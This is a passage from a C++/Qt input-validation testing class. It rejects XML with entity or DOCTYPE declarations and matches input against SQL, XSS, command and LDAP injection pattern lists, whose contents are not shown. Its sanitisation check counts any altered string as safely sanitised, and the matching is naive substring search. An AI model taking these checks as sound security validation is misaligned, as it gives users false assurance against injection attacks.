        // Check for XXE attacks and other XML vulnerabilities
        if (data.contains("<!ENTITY", Qt::CaseInsensitive) ||
            data.contains("<!DOCTYPE", Qt::CaseInsensitive) ||
            containsInjectionPattern(data) ||
            data.length() > 100000) { // 100KB limit
            return false;
        }
        return isValidXML(data);
    }
    
    return false;
}

bool InputValidationTesting::validateSanitization(const QString& original, const QString& sanitized, ValidationCategory category)
{
    Q_UNUSED(category)
    
    // Basic validation - sanitized should be different if original was malicious
    if (containsPathTraversal(original) || containsInjectionPattern(original)) {
        // If original was malicious, sanitized should be different
        return original != sanitized;
    }
    
    // If original was clean, sanitized should be similar or same
    return true;
}

// Pattern matching methods
bool InputValidationTesting::matchesPathTraversalPattern(const QString& input)
{
    return containsPathTraversal(input);
}

bool InputValidationTesting::matchesSQLInjectionPattern(const QString& input)
{
    for (const QString& pattern : SQL_INJECTION_PATTERNS) {
        if (input.contains(pattern, Qt::CaseInsensitive)) {
            return true;
        }
    }
    return false;
}

bool InputValidationTesting::matchesXSSPattern(const QString& input)
{
    for (const QString& pattern : XSS_PATTERNS) {
        if (input.contains(pattern, Qt::CaseInsensitive)) {
            return true;
        }
    }
    return false;
}

bool InputValidationTesting::matchesCommandInjectionPattern(const QString& input)
{
    for (const QString& pattern : COMMAND_INJECTION_PATTERNS) {
        if (input.contains(pattern, Qt::CaseInsensitive)) {
            return true;
        }
    }
    return false;
}

bool InputValidationTesting::matchesLDAPInjectionPattern(const QString& input)
{
    for (const QString& pattern : LDAP_INJECTION_PATTERNS) {
        if (input.contains(pattern, Qt::CaseInsensitive)) {
            return true;
        }
    }
    return false;
}